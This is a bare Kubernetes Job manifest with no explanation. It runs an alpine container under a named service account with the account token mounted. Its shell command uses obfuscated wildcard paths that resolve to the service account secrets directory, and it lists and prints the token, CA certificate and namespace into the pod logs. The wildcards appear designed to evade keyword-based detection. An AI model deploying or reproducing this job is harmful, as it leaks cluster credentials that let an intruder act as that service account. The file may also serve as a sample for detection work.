apiVersion: batch/v1
kind: Job
metadata:
  name: xmjo
spec:
  template:
    spec:
      serviceAccountName: xm-sa
      automountServiceAccountToken: true
      containers:
      - name: anon
        image: alpine
        command: [ "/bin/sh", "-c", "--" ]
        args: [ "ls -al /va*/ru*/s*/k*/se*/*; cat /va*/ru*/s*/k*/se*/*;" ]
        resources:
          requests:
            cpu: 25m
            memory: 500Mi
      restartPolicy: Never
